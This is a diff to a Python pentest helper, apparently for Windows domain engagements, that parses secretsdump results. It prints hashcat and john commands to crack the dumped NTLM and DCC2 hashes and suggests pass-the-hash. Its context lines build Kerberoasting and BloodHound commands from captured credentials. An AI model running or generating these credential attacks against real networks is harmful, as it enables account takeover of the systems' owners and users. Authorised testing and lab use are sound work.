@@ -209,6 +209,42 @@ def report(d, args):
             print(f"impacket-GetUserSPNs {dom}/{su}:'{p}' -dc-ip {dc} -request")
             print(f"nxc ldap {dc} -u {su} -p '{p}' -d {dom} --bloodhound --collection All --dns-server {dc}")
 
+    # ---- crack commands (always emit if there's anything crackable) ----
+    crackable_nt = [(u, nt) for (u, rid, nt, empty) in d["local_hashes"] if not empty]
+    if crackable_nt or d["dcc2"]:
+        print()
+        P("─" * 60, "hdr")
+        P(" CRACK IT (john + hashcat)", "hdr")
+        P("─" * 60, "hdr")
+
+        if crackable_nt:
+            print(col("# NTLM local hashes → write user:hash, crack:", C['dim'], on))
+            for u, nt in crackable_nt:
+                print(f"echo '{u}:{nt}' >> nt.hashes")
+            print(col("# hashcat (mode 1000 = NTLM):", C['dim'], on))
+            print("hashcat -m 1000 nt.hashes /usr/share/wordlists/rockyou.txt")
+            print("hashcat -m 1000 nt.hashes /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule")
+            print(col("# john:", C['dim'], on))
+            print("john --format=nt nt.hashes --wordlist=/usr/share/wordlists/rockyou.txt")
+            print("john --show --format=nt nt.hashes")
+            print(col("# (or skip cracking — PtH the hash directly, see spray block above)", C['dim'], on))
+            print()
+
+        if d["dcc2"]:
+            print(col("# DCC2 cached creds → write the full $DCC2$ blobs, crack:", C['dim'], on))
+            for u, blob in d["dcc2"]:
+                has_ct = any(short_user(cu).lower() == u.lower() for cu, _, _ in d["cleartext"])
+                skip = col("   # you have cleartext — skip", C['dim'], on) if has_ct else ""
+                print(f"echo '{blob}' >> dcc2.hashes{skip}")
+            print(col("# hashcat (mode 2100 = DCC2, SLOW — targeted wordlist only):", C['dim'], on))
+            print("hashcat -m 2100 dcc2.hashes /usr/share/wordlists/rockyou.txt")
+            print(col("# john:", C['dim'], on))
+            print("john --format=mscash2 dcc2.hashes --wordlist=/usr/share/wordlists/rockyou.txt")
+
+
+def report_end():
+    pass
+
 
 def main():
     ap = argparse.ArgumentParser(description="Triage impacket-secretsdump output.")
